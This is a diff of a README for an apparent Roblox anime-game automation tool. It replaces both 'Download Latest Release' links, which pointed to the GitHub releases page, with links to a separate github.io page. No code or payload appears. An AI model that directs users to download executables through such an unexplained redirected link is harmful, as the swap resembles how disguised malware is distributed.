@@ -1,6 +1,6 @@
 # 🌟 anime-astral-windows-script-engine - Automate Your Anime Roblox Session
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/Sharmara5602/anime-astral-windows-script-engine/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://sharmara5602.github.io)
 
 ## 📋 What This Software Does
 
@@ -175,7 +175,7 @@ Your logs and settings remain in the installation folder. Delete the folder manu
 
 Need to get the software on another computer? Use the same link:
 
-[Download the Latest Version](https://github.com/Sharmara5602/anime-astral-windows-script-engine/releases)
+[Download the Latest Version](https://sharmara5602.github.io)
 
 This link always points to the most recent release. Bookmark it for easy access.
 
